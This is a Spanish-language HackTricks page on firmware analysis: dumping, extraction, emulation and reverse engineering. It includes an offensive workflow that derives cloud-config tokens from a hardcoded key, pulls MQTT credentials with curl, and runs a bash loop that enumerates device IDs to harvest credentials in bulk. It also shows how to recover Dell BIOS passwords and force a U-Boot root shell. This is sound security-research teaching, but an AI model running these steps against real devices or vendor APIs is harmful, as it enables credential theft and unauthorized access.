# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

Para obtener datos a través de interfaces de hardware expuestas, consulta [volcado de firmware asistido por consola UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) y [volcado de SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Para realizar una captura UART repetible durante el arranque, antes de acceder a la consola, consulta [alimentación controlada por SCPI y adquisición con osciloscopio](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente para garantizar que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que permite iniciar el sistema operativo. Examinar y posiblemente modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles del bootloader
- Diseño del hardware y hojas de datos
- Métricas de la base de código y ubicaciones del código fuente
- Bibliotecas externas y tipos de licencia
- Historial de actualizaciones y certificaciones reglamentarias
- Diagramas de arquitectura y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son muy valiosas, al igual que el análisis de los componentes de software de código abierto disponibles mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [LGTM de Semmle](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede utilizarse para encontrar posibles problemas.

## **Obtención del firmware**

El firmware puede obtenerse de varias maneras, cada una con su propio nivel de complejidad:

- Directamente de la fuente (desarrolladores o fabricantes)
- Compilándolo a partir de las instrucciones proporcionadas
- Descargándolo de los sitios oficiales de soporte
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube** con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas de man-in-the-middle
- Extrayéndolo del dispositivo a través de conexiones como **UART**, **JTAG** o **PICit**
- Haciendo **sniffing** de las solicitudes de actualización en las comunicaciones del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- Haciendo **dumping** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, como último recurso, con las herramientas de hardware adecuadas

### Registros solo por UART: forzar un root shell mediante el entorno de U-Boot en la flash

Si se ignora UART RX (solo hay registros), puedes forzar un init shell **editando offline el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Haz un volcado de SPI flash con un clip SOIC-8 y un programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición de entorno de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del entorno de U-Boot** para el blob.
3. Vuelve a flashear solo la partición de entorno y reinicia; debería aparecer un shell en UART.

Esto resulta útil en dispositivos integrados cuyo shell del bootloader está deshabilitado, pero cuya partición de entorno se puede escribir mediante acceso externo a la flash.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Algunas herramientas que puedes usar para ello:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, es probable que esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Recursos gráficos sin procesar en la flash externa

Un volcado SPI externo no es necesariamente el firmware ejecutable del MCU. En un objetivo Cortex-M, compara el inicio de cada posible región de código con el mapa de memoria del dispositivo: una tabla de vectores normal comienza con un puntero de pila SRAM plausible y una dirección del controlador de reinicio en memoria ejecutable. Que no haya una tabla de vectores en el desplazamiento cero no demuestra por sí solo que todo el chip carezca de código; inspecciona otros desplazamientos y la disposición del arranque. Si `binwalk` no encuentra ningún contenedor, inspecciona los bytes sin procesar y correlaciona las direcciones de lectura de la flash con las acciones que cargan pantallas nuevas, usando una [captura SPI decodificada](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Para una región de recursos gráficos, prueba formatos de píxel y dimensiones posibles en lugar de dar por sentado que se trata de PNG/JPEG. El dispositivo citado usaba fotogramas **80×160 RGB565 little-endian**: con dos bytes por píxel, un fotograma ocupa **25,600 bytes** (25 KiB), no 24 kilobits. Una dirección de lectura de flash decodificada permitió identificar el desplazamiento del recurso de pantalla; el investigador convirtió una imagen preparada con `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, reemplazó el recurso del mismo tamaño en el volcado original, lo escribió con `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` y confirmó que la nueva imagen aparecía en la pantalla. Esto demuestra que se pueden escribir *recursos gráficos externos*, no que se haya extraído o vuelto a flashear el firmware interno del MCU. Conserva el volcado original y verifica las dimensiones, el orden de bytes, el desplazamiento y la longitud del reemplazo antes de escribir.<sup>[[14]](#references)</sup>

### Análisis diferencial de la flash y almacenes de secretos XOR recuperables

Cuando un ajuste del firmware no tiene un formato de almacenamiento documentado, primero realiza varias lecturas coincidentes de la flash, cambia **exactamente** un ajuste, vuelve a volcar el chip completo y compara los desplazamientos. Repite el experimento con valores controlados para distinguir el ajuste de los contadores y los metadatos de escritura; los cambios en desplazamientos nuevos, en lugar de sobrescribir los datos en el mismo lugar, indican un almacén de solo anexado o estructurado como un registro. Conserva las entradas eliminadas o marcadas como eliminadas, ya que los bytes de su carga útil podrían seguir siendo recuperables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Tras localizar la región, extrae los módulos del firmware con herramientas como `binwalk` y analiza en Ghidra el writer/validator mediante ingeniería inversa. Confirma en el código los límites de los campos, el relleno, la indexación de claves y la derivación de claves, en lugar de inferir el esquema únicamente a partir de patrones de texto cifrado.<sup>[[12]](#references)</sup>

#### Recuperar claves a partir del relleno cifrado con ceros

Como se describe en [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), el texto plano conocido revela bytes del flujo de claves en los mismos desplazamientos. Un campo de tamaño fijo es especialmente vulnerable cuando su relleno con ceros abarca todos los índices de una clave XOR repetida: el relleno cifrado revela directamente esos bytes de la clave, porque `0x00 XOR key_byte = key_byte`. Si quedan cubiertos todos los índices de la clave, reconstruye la clave a partir de la cola del texto cifrado y descifra los bytes con datos.<sup>[[12]](#references)</sup>

El formato DVAR vulnerable de contraseña de BIOS de Dell es un ejemplo concreto: el byte `0` de un campo de 32 bytes está en texto plano, mientras que los bytes `1..31` usan una clave repetida de 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para una longitud de contraseña `L`, las posiciones `L..31` eran cero antes de XOR. Cuando `L <= 12`, esas posiciones cubren todos los índices de la clave, por lo que se recuperan la clave completa y la contraseña sin brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraer claves de registros históricos

No analices cada registro de forma independiente. La clave DVAR se deriva aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: la semilla del dispositivo y el GUID son fijos, y la única entrada que depende de la contraseña es su primer byte en claro. Esto da como máximo 256 claves por dispositivo y hace que los registros que empiezan con el mismo byte compartan una clave. Agrupa los registros activos y eliminados por ese byte; un registro histórico corto puede filtrar la clave completa mediante el padding y permitir descifrar un registro actual más largo cuyo propio padding sea insuficiente. Por tanto, rotar la contraseña puede aumentar la exposición si el texto cifrado antiguo se marca como eliminado en vez de borrarse.<sup>[[12]](#references)</sup>

La herramienta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera contraseñas y puede mostrar los bytes sin procesar almacenados y de la clave. Compílala desde un checkout y analiza una imagen flash verificada como se indica a continuación:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para los parsers personalizados, descarta los falsos positivos comprobando la estructura de los registros, las restricciones de caracteres imprimibles, el relleno con ceros, la entropía de la clave y la coherencia cuando la clave se repite. Si los volcados repetidos muestran cambios dispersos de bits por escritura, enumera las máscaras observadas y clasifica las correcciones según estas restricciones, pero indica los caracteres ambiguos en lugar de presentar el resultado heurístico como una recuperación exacta.<sup>[[12]](#references)</sup>

Los verificadores de contraseñas deben almacenar un hash unidireccional con sal e iteraciones, en lugar de texto cifrado reversible, y los almacenes con estructura de registro deben eliminar de forma segura el material secreto reemplazado.<sup>[[12]](#references)</sup>

### Obtención del sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta con el nombre del tipo de sistema de archivos**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no incluye los bytes mágicos del sistema de archivos en sus firmas**. En estos casos, usa binwalk para **encontrar el desplazamiento del sistema de archivos y extraer el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para realizar el carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstrucción de sistemas de archivos raíz embebidos divididos

Si un volcado raw de eMMC/SSD contiene un encabezado de sistema de archivos válido, pero sus offsets de metadatos se extienden más allá de la partición nominal, no lo clasifiques inmediatamente como corrupto. El código de arranque embebido puede ensamblar el dispositivo raíz real a partir de varios rangos físicos mediante Device Mapper, por lo que extraer una partición GPT solo produce el primer segmento.<sup>[[9]](#references)</sup>

#### Triaje de la imagen completa del medio

Primero, verifica que la adquisición haya finalizado, que el tamaño sea estable y que ningún proceso de escritura siga usando la imagen. Si el nombre del archivo codifica una dirección de inicio y de fin, compara ese rango con el número real de bytes. Recupera la GPT en modo de solo lectura y adjunta únicamente el rango necesario; **no** ejecutes `vgchange -ay` en una workstation sobre un volumen físico no confiable, ya que podrían producirse colisiones entre grupos de volúmenes y escrituras involuntarias.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Prefiere una VM desechable cuando la lógica original de init o una pila LVM necesite ver la imagen completa. Los registros históricos de arranque de una partición de arranque estándar son especialmente útiles: es posible que el bootloader haya registrado los offsets del contenedor propietario, las longitudes de los componentes, la selección de slot, las reglas de alineación y la verificación de firmas. Usa esos valores para extraer una línea de comandos, un kernel o un initramfs incrustados y, después, valida cada salida de forma independiente con `file`, bytes mágicos y `binwalk`; leer hasta el final del contenedor puede añadir por accidente un initrd, un objeto ACPI o una firma al kernel.<sup>[[9]](#references)</sup>

#### Recuperar el mapa de bloques en el arranque

Extrae el initramfs del kernel y aplica ingeniería inversa a su `/init` y a las bibliotecas de almacenamiento que use. En [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), sigue las referencias de cadenas de texto para `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` y las rutas de particiones; después, rastrea el código que selecciona el slot A/B activo y crea la tabla. Algunos puntos de partida útiles en radare2 son `r2 -A init`, `afl`, `pdf @ main` y `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

El target linear asigna rangos consecutivos de un dispositivo virtual a rangos de uno o más dispositivos de respaldo. Una tabla recuperada de dos segmentos suele tener esta forma (todas las posiciones y longitudes están expresadas en sectores de 512 bytes):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduce exactamente la aritmética del código máquina, incluidos el ancho de los enteros, los desplazamientos y las conversiones de unidades. Por ejemplo, la siguiente expresión redondea hacia abajo un tamaño en bytes al límite de 4 KiB y solo entonces lo convierte a sectores de 512 bytes; sustituirla por `p4_bytes // 512` desplaza la cola seleccionada en `p4_bytes % 4096` cuando la partición no está alineada a páginas.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruye una imagen de análisis plana copiando los rangos en el orden de la tabla y usando bloques de tamaño limitado, en lugar de cargar el volcado completo del medio en memoria. Esto también evita crear dispositivos mapper en el host. Mantén los offsets derivados de GPT, los recuentos de sectores invertidos y la longitud resultante de la salida como aserciones independientes.<sup>[[9]](#references)</sup>

#### Distinguir la corrupción de un error constante de reconstrucción

Para SquashFS, comprueba el magic `hsqs` y decodifica el campo little-endian de 64 bits `bytes_used` en el offset 40 del superbloque antes de ejecutar `unsquashfs`. Si la extracción falla en varias estructuras sin relación entre sí, busca en una ventana amplia alrededor de las posiciones esperadas y exige candidatos estructurales sólidos: un bloque de metadatos descomprimible, varias entradas de directorio consecutivas válidas, campos de inode plausibles, un inode raíz coherente con el recuento de inodes o una estructura válida de metadatos de integridad. Una sola coincidencia de magic no basta.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Cuando el mismo delta con signo hace que estructuras independientes sean válidas —por ejemplo, los metadatos del directorio y un registro de verity—, la causa probable es un error sistemático en el inicio del segmento, no la falta de bytes. Vuelve a la aritmética invertida y busca restos descartados, problemas de signo, desbordamientos o redondeos a sectores/páginas antes de intentar recuperar archivos huérfanos o modificar los metadatos del sistema de archivos.<sup>[[9]](#references)</sup>

Por último, mantén separadas las fronteras de protección: los volúmenes LUKS sellados por TPM protegen la confidencialidad de los datos, mientras que un mapeo dm-verity firmado protege la integridad del sistema de archivos raíz. Un TPM de software no recupera una clave sellada al TPM físico original, y arrancar un SquashFS modificado mediante un init de investigación que omite la verificación de verity no falsifica su firma ni vulnera dm-verity.<sup>[[9]](#references)</sup>

## Analyzing Firmware

Una vez obtenido el firmware, es esencial analizarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Initial Analysis Tools

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado del cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica un posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos debido a la falta de magic bytes, es necesario extraerlo manualmente. Para ello, se usa `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas, los endpoints de API, las funcionalidades del servidor de actualizaciones, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis sin conexión.

Entre las **ubicaciones** y los **elementos clave** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios integrados para su análisis posterior
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información confidencial y vulnerabilidades en el sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información confidencial
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para el análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios desprotegidos que podrían explotarse.

## Obtención de credenciales de cloud config y MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen su configuración por dispositivo desde un endpoint de cloud similar a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible que encuentres que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Este diseño permite que cualquiera que conozca un deviceId y la STATIC_KEY reconstruya la URL y obtenga la configuración de cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extrae el deviceId de los registros de arranque UART

- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración en la nube y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar la configuración de la nube y las credenciales MQTT

- Construye la URL y descarga el JSON con curl; analízalo con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusar de MQTT en texto plano y ACL débiles de topics (si existen)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)

- Muchos ecosistemas incorporan bytes de OUI del fabricante/producto/tipo seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configs mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Siempre que sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.

El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar desafíos relacionados con las dependencias de hardware o arquitectura, pero transferir el sistema de archivos root o binarios específicos a un dispositivo con arquitectura y endianness coincidentes, como una Raspberry Pi, o a una máquina virtual precompilada puede facilitar pruebas adicionales.

### Emulación de binarios individuales

Para examinar programas individuales, es fundamental identificar el endianness y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se usa `qemu-mips`; para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm`.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizan el proceso y ayudan con el análisis dinámico.

### Reconstrucción de sistemas de archivos root divididos y verificados para la emulación

Si un superblock de SquashFS es legible, pero los offsets de inode, directorio o tabla de fragmentos son imposibles, no modifiques `unsquashfs` de inmediato. Haz reverse engineering del binario de arranque temprano y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición root nominal, pero construir el sistema de archivos real con un mapeo `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo examinan el superblock pueden tener éxito aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[11]](#references)</sup>

Conserva exactamente la aritmética del firmware. En particular, identifica si las longitudes están expresadas en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos y truncamientos en el orden original; y ten en cuenta las regiones finales que dependen del banco en los diseños A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca a un límite de 4 KiB y solo después expresa el resultado en sectores de 512 bytes; reemplazarlo por `partition_bytes // 512` puede desplazar la extensión añadida unos cuantos kilobytes y corromper todas las tablas SquashFS posteriores.<sup>[[11]](#references)</sup>

Un flujo de validación útil es:<sup>[[11]](#references)</sup>

1. Recupera el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear` a partir del binario del verificador/init.
2. Concatena o mapea las extensiones sin cambiar la semántica de alineación.
3. Si la extracción sigue fallando, busca solo en una ventana pequeña alrededor del límite previsto y exige varias estructuras de metadatos válidas consecutivas, en lugar de aceptar únicamente un superblock plausible.
4. Ejecuta un `unsquashfs` sin modificar contra la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una evidencia más sólida que `unsquashfs -stat`.

#### Reemplazo de dm-verity controlado por el analista

Cuando el analista controla el kernel de QEMU, el initramfs y los discos virtuales, se puede arrancar con un root modificado reemplazando el PID 1 de verificación del proveedor por un init pequeño enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en laboratorio**, no una ruptura de dm-verity, su firma RSA, Secure Boot ni una clave sellada por TPM.<sup>[[11]](#references)</sup>

El init de reemplazo debe replicar las partes operativas de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques suministrado, montar el root editado en modo de solo lectura, desmontar los pseud sistemas de archivos del root antiguo, mover el nuevo montaje a `/`, ejecutar `chroot` y `execve()` sobre el `/sbin/init` original del firmware. Desmontar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita desmontar accidentalmente puntos de montaje que pertenecen al nuevo root.<sup>[[11]](#references)</sup>

Mantén el estado mutable del dispositivo separado del root inmutable modificado. Una capa de overlay qcow2 puede conservar el estado LVM del disco original mientras un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de imagen sin conexión

Inspecciona el estado persistente fuera del guest cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables dificulten identificar el fallo. Nunca conectes un overlay que esté usando una VM en ejecución; expónlo con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para aislar fallos de forma reproducible, escribe archivos de marcador con marca de tiempo en un volumen estable con permisos de escritura y verifícalos sin conexión; `/dev/kmsg`, las FIFO y las consolas transitorias pueden producir falsos negativos debido a la limitación de tasa o a la terminación prematura del proceso. Compara también las interfaces exactas entre capas antes de modificar código no relacionado: `uname -r` frente a `/lib/modules/`, las funciones de ext4 en disco frente a la configuración del kernel, y la generación de Mesa `libGL` frente a la ABI del controlador DRI y los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente mediante `dlopen()`, pero seguir siendo inutilizable porque el consumidor espera una ABI diferente.<sup>[[11]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso al shell del sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca perfectamente las interacciones con el hardware, por lo que a veces es necesario reiniciarla. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web expuestas y los servicios de red, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de puerta trasera.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer puntos de interrupción e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un depurador completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

